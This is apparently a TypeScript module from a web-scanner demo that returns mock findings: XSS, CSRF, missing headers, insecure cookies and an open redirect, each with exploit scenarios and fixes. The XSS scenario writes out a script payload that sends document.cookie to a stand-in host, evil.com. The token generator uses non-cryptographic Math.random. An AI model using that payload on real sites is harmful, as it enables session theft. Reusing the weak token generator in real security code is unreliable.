import { ScanResult, Vulnerability } from "@/types/scanner";

export function generateToken(): string {
  const chars = "abcdef0123456789";
  let token = "sv-";
  for (let i = 0; i < 32; i++) {
    token += chars[Math.floor(Math.random() * chars.length)];
  }
  return token;
}

// Mock scan results for demo
export function getMockScanResult(url: string): ScanResult {
  const vulnerabilities: Vulnerability[] = [
    {
      id: "vuln-001",
      url: `${url}/search?q=`,
      type: "reflected-xss",
      severity: "high",
      title: "Reflected Cross-Site Scripting (XSS)",
      description:
        "The search parameter reflects user input directly into the HTML response without proper encoding. An attacker could craft a malicious URL containing JavaScript code that executes in the victim's browser.",
      exploitScenario:
        "An attacker sends a phishing email containing a link like: " +
        url +
        '/search?q=<script>document.location="https://evil.com/steal?c="+document.cookie</script>. When the victim clicks the link, their session cookies are stolen.',
      remediation:
        "Implement output encoding using context-appropriate escaping. Use Content-Security-Policy headers to prevent inline script execution. Apply input validation with an allowlist approach.",
      owaspCategory: "A03:2021 – Injection",
    },
    {
      id: "vuln-002",
      url: `${url}/contact`,
      type: "csrf",
      severity: "medium",
      title: "Missing CSRF Protection on Form",
      description:
        "The contact form does not include a CSRF token. This allows an attacker to craft a malicious page that submits the form on behalf of an authenticated user.",
      exploitScenario:
        "An attacker creates a hidden form on their website that auto-submits to the target's contact endpoint. When a logged-in user visits the attacker's page, the form is submitted with the user's session.",
      remediation:
        "Implement anti-CSRF tokens (synchronizer token pattern). Use SameSite cookie attribute. Verify the Origin/Referer header on state-changing requests.",
      owaspCategory: "A01:2021 – Broken Access Control",
    },
    {
      id: "vuln-003",
      url: url,
      type: "missing-headers",
      severity: "medium",
      title: "Missing Security Headers",
      description:
        "Several important security headers are missing from the HTTP response: X-Content-Type-Options, X-Frame-Options, Strict-Transport-Security, and Content-Security-Policy.",
      exploitScenario:
        "Without X-Frame-Options, the site can be embedded in a malicious iframe for clickjacking attacks. Without HSTS, users are vulnerable to SSL-stripping attacks on initial connection.",
      remediation:
        "Add the following headers: Strict-Transport-Security: max-age=31536000; includeSubDomains, X-Content-Type-Options: nosniff, X-Frame-Options: DENY, Content-Security-Policy with a restrictive policy.",
      owaspCategory: "A05:2021 – Security Misconfiguration",
    },
    {
      id: "vuln-004",
      url: `${url}/login`,
      type: "insecure-cookies",
      severity: "low",
      title: "Session Cookie Missing Secure Flags",
      description:
        "The session cookie is set without the Secure and HttpOnly flags. This may allow cookie theft via XSS or man-in-the-middle attacks.",
      exploitScenario:
        "If an XSS vulnerability exists, the attacker can access the session cookie via document.cookie since HttpOnly is not set. Without the Secure flag, cookies may be transmitted over unencrypted connections.",
      remediation:
        "Set cookies with: Secure, HttpOnly, SameSite=Strict flags. Ensure all cookie transmission occurs over HTTPS only.",
      owaspCategory: "A05:2021 – Security Misconfiguration",
    },
    {
      id: "vuln-005",
      url: `${url}/redirect?url=`,
      type: "open-redirect",
      severity: "low",
      title: "Open Redirect Vulnerability",
      description:
        "The redirect parameter accepts arbitrary URLs, allowing attackers to redirect users to malicious websites while appearing to link from a trusted domain.",
      exploitScenario:
        "An attacker crafts a URL like " +
        url +
        "/redirect?url=https://evil-phishing-site.com that appears to be a legitimate link from the target domain, tricking users into visiting a phishing page.",
      remediation:
        "Validate redirect URLs against an allowlist of permitted domains. Use relative URLs instead of absolute URLs for redirects. Display a warning page before redirecting to external domains.",
      owaspCategory: "A01:2021 – Broken Access Control",
    },
  ];

  return {
    targetUrl: url,
    scanDate: new Date().toISOString(),
    duration: "2m 34s",
    pagesScanned: 47,
    inputsFound: 12,
    vulnerabilities,
    summary: {
      critical: 0,
      high: 1,
      medium: 2,
      low: 2,
      info: 0,
    },
  };
}
